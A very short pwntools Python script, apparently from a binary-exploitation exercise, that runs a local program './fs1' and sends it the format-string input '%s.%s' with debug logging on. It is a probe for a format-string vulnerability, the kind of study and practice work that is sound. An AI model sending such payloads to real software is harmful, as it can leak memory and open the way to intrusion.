from pwn import *

context.log_level = "debug"

p = process('./fs1')
p.sendline(b'%s.%s')

p.recvall()
